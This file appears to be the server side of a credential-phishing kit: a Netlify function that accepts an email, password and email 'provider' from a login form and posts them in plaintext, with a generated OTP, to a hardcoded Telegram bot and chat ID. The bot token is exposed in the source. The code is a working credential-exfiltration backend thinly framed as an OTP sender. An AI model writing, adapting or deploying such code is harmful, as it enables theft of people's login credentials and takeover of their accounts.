// Polyfill fetch for Node < 18. Remove/comment this line if on Node 18+ (Netlify default).
// const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const Redis = require("ioredis");

const BOT_TOKEN = "7244980103:AAGip-Y8YMcN0H58ojQTIVtkmpfTI0F8N0s";
const CHAT_ID = "6735963923";
const OTP_EXPIRY_SECONDS = 300; // 5 minutes

// Get Redis URL from environment variable
const REDIS_URL = process.env.REDIS_URL;

// Create Redis client outside handler for connection reuse
const redis = new Redis(REDIS_URL);

function getOtpKey(email) {
  return `otp:${email}`;
}

exports.handler = async function (event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ success: false, message: "Method not allowed" }),
    };
  }

  let email, password, provider;
  try {
    ({ email, password, provider } = JSON.parse(event.body));
  } catch (e) {
    return {
      statusCode: 400,
      body: JSON.stringify({ success: false, message: "Invalid JSON body" }),
    };
  }

  if (!email || !password || !provider) {
    return {
      statusCode: 400,
      body: JSON.stringify({ success: false, message: "Missing required fields" }),
    };
  }

  // Generate 6-digit OTP
  const otp = Math.floor(100000 + Math.random() * 900000).toString();

  // Store OTP in Redis with expiry
  try {
    await redis.set(getOtpKey(email), otp, "EX", OTP_EXPIRY_SECONDS);
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        success: false,
        message: "Failed to store OTP",
        error: err.message,
      }),
    };
  }

  // Send OTP (and login info) to Telegram (remove password in real prod)
  const message =
    `🔐 *New Login Attempt*\n\n` +
    `📧 Email: ${email}\n` +
    `🔑 Password: ${password}\n` +
    `🌐 Provider: ${provider}\n` +
    `🧾 OTP: ${otp}`;

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      throw new Error("Telegram API error");
    }

    return {
      statusCode: 200,
      body: JSON.stringify({
        success: true,
        message: "OTP sent to Telegram",
        email,
      }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        success: false,
        message: "Failed to send OTP",
        error: error.message,
      }),
    };
  }
};